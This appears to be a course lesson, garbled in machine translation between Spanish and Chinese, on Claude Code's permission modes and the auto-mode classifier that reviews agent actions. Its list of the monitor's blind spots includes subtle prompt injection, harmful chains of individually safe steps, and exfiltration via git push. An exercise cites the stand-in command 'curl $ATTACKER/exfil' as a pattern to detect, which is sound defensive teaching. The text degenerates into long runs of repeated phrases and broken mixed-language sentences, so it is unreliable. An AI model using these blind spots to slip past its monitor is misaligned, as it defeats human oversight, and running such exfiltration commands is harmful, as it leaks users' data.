# Modelo de autoridad del agente independiente

> 权限阶梯 de la revisión por movimiento hasta la aprobación de todo 是利用 管理控自治代理 无需询问就能做的方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能做什么方式. 无需询问就能执行的模式. 无需询问的模式. 无需查询问的模式.`auto` Módulo de autoridad  con un modelo de clasificador independiente  sustituir por la ratificación de la acción: se realiza en cada acción pre-examinando la acción, y impide cualquier mejora que supere el alcance de la solicitud                                                                                                                                                                                                                                    `max_turns`Y `max_budget_usd`强制执行――:`auto`¿Es posible o no dependerá de si el plan, la organización, el modelo y el proveedorAntropico han afirmado claramente que el clasificador 单独使用并不足──

**类型：**El aprendizaje
**语言：**Python(stdlib, dos fases simulador de clasificadores)
**先修要求：**Fase 15 · 01(agentes de largo horizonte),Fase 15 · 09(paisaje de agentes codificadores)
**时间：** 45 minutos

##  problemas

El agente de codificación autónoma de tu máquina es una categoría de seguridad independiente. El ataque es ese agente que puede acceder a todo el sistema de archivos, redes, credenciales, clipboard, cualquier pestaña de navegador, cualquier terminal abierto. Bruce Schneier, etc. ya ha señalado públicamente que los agentes de uso de computadoras no son una vez  funciones de los chatbots, sino una nueva herramienta, con una nueva forma de riesgo.

El sistema de derechos de Claude Code es una respuesta antropeca. No es un sistema autónomo / no autónomo, sino que tiene la capacidad de crear seis modos: plan → por defecto → acepta Edits → ... → bypassPermissions. Cada tipo de modo se diferencia entre la velocidad y el examen de cada movimiento.

¿Qué puede captar el sistema, qué pierde, y qué modelo debe utilizar una tarea determinada?

## 概念

### 六种权限模式

| 模式 | 行为 | 使用场景 |
|---|---|---|
| `plan` | Agent 提出计划；用户批准整个计划；每个动作在执行前都会被审查 | 不熟悉的任务；接近 prod 的代码；第一次在某个 repo 上使用 agent |
| `default` | 在 UI 中标为 “Manual”。Agent 运行动作；对任何“有风险”的动作提示用户（shell exec、destructive operations、network calls） | 大多数交互式 coding sessions |
| `acceptEdits` | 文件写入自动批准；shell exec 和 network calls 仍然提示 | 跨很多文件的 refactoring pass |
| `auto` | 由一个独立的 classifier model 在每个动作运行前审阅它；阻止任何超出请求范围的升级 | 受限 workspace 中的 long-horizon unattended runs |
| `dontAsk` | 从不提示；未被 permission rules 预先批准的动作一律拒绝 | 临时 sandboxes、CI jobs、research scripts |
| `bypassPermissions` | 批准一切 | 文档说明为“只在你愿意丢弃的 ephemeral containers 内使用” |

(Nombre de arriba con código público de Claude Docs un致;UI 把 `default`标为 Manual。)

### Una página para entender el modo automático

El modo automático (en inglés Auto Mode, 2026 3 月 24 日发布) es el primer modo de autorización de un modelo.

1. **一个独立的 classifier model。**En cada movimiento propuesto antes de ejecutarlo, según la declaración de tareas y sesión, el estado actual para juzgar, y evitar cualquier mejora que exceda el alcance de la solicitud.
2. **受限的可用性。**Sí, no se puede`auto`depende de si el plan 、 organización es activado 、 modelo y proveedor ‖

 presupuestario control y clasificador no se encuentran:

- `max_turns` Una sesión                                                                                                                                                                                                                                                             
- `max_budget_usd` 触发 sesión 中止的美元上限──
- Cada herramienta tiene un número limitado de movimientos, por ejemplo, no más de N veces.`WebFetch`llamadas) ⋅

### ¿Qué es lo que el sistema puede captar?

- Ingresos de herramientas Mediante inyección directa de inmediato, entre los cuales se inyecta una instrucción de mapeo hasta el estado de movimiento conocido de riesgo.
- 重复 herramienta buclesclasificador se puede ver la acción N+1 con la acción N 连续五次几乎相同──
- En la sesión de la edición de documentos, se obtienen comandos de shell.

### El sistema puede perder algo

- **微妙的 prompt injection**, se ajustará el comportamiento, pero no producirá un solo movimiento marcado. Injección de respuesta indirecta no es una falla completamente reparable.
- **语义层面的不当行为。**Cada movimiento individual parece seguro, pero la trayectoria de la combinación es perjudicial.
- **通过合法渠道 exfiltration。**Escribir los datos en los archivos que tengas, y luego.`git push`Hasta el repuesto público, es una serie de movimientos permitidos, pero el problema está en su composición.

### Previsión de la investigación 定位

En el caso de las aplicaciones de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la ley, el usuario puede ser objeto de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la aplicación de la

### Esta es la escalera en su flujo de trabajo

- tareas desconocidas: desde`plan`開始──閱讀計劃比回滚一次糟糕運行更便宜──
- 已知 refactor:`acceptEdits`能省下大量确认点击──
- ejecutar trasfondo sin supervisión: sólo en el espacio de trabajo que ya has medido el radio de la explosión`auto`(sin credenciales, sin montajes de producción, sin salida de la selección de tu trabajo)
- Contenedores efémeros: cuando y sólo cuando contenedores y sus credenciales son desechables,`dontAsk`- ¿ Qué ?`bypassPermissions`Sólo puedo aceptarlo.

```figure
autonomy-oversight
```

## Usalo

`code/main.py`Colocar un clasificador de revisión de acción 模拟成两阶段管线 es una simplificación de la enseñanza; real `auto`模式背后 es un modelo de clasificador independiente, en lugar de tener dos fases de acuerdo documental. La etapa 1 es una regla de palabras clave baratas dirigida a la acción propuesta. La etapa 2 es un revisor de reglas múltiples más lento.

##  entregarlo

`outputs/skill-permission-mode-picker.md`La descripción de las tareas se ajusta a los modelos de limitación de poder, límites presupuestarios y separación necesaria.

##  ejercicios

1. 运行                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           `code/main.py`¿Qué tipo de acción sintética no se marca en la etapa 1 pero se captura en la etapa 2?

2. 扩展 1 juego de reglas de la etapa, para capturar una determinada forma conocida-mala, por ejemplo `curl $ATTACKER/exfil`En la muestra de acción benigna, la tasa de falsos positivos se mide.

3. 阅读 Antropic's "Cómo funciona el bucle del agente" 文档──列出 agent 在 `default`模式下默认触碰的每种外部状态──在无监督运行 `auto`¿Qué necesitas para una puerta?

4. 设计一个 24 小时 无监督运行预算:`max_turns`¿Qué es esto?`max_budget_usd`、 por herramienta caps、allowlists―说明每个数字的理由―

5. 描述一个轨迹: de ellos cada uno de los individuos movimientos fueron clasificados 批准, pero el comportamiento de la combinación fue desalineado.

## 关键术语: "El hombre es un hombre"

| 术语 | 人们常说 | 实际含义 |
|---|---|---|
| 权限模式 | “agent 能做多少事” | 控制逐动作批准的六种命名 policy 之一 |
| plan mode | “做任何事前都询问” | Agent 编写计划；用户在执行前批准 |
| acceptEdits | “让它写文件” | 文件写入自动批准；shell exec 仍然提示 |
| auto | “Auto approvals” | 独立的 classifier model 审阅每个动作；阻止超出请求范围的升级 |
| bypassPermissions | “Full YOLO” | 批准一切；预期用于 ephemeral containers |
| Stage 1（simulator） | “Fast keyword check” | `code/main.py` 中针对拟议动作的廉价 rule |
| Stage 2（simulator） | “Deep review” | `code/main.py` 中针对被标记动作的更慢 multi-rule reviewer |
| Research preview | “Not GA” | Anthropic 对 failure mode 仍在被映射的功能所使用的定位 |

## 延伸阅读

- [Anthropic — How the agent loop works](https://code.claude.com/docs/en/agent-sdk/agent-loop) 权限模式、预算、行动格式──
- [Anthropic — Claude Managed Agents overview](https://platform.claude.com/docs/en/managed-agents/overview) servicio administrado 执行模型。
- [Anthropic — Claude Code product page](https://www.anthropic.com/product/claude-code) superficie de la función y el anuncio de modo automático.
- [Anthropic — Claude's Constitution (January 2026)](https://www.anthropic.com/news/claudes-constitution) 塑造分类器 判断的基于理性的层──
- [Anthropic — Measuring agent autonomy in practice](https://www.anthropic.com/research/measuring-agent-autonomy) 关于 diseño de permisos de largo horizonte
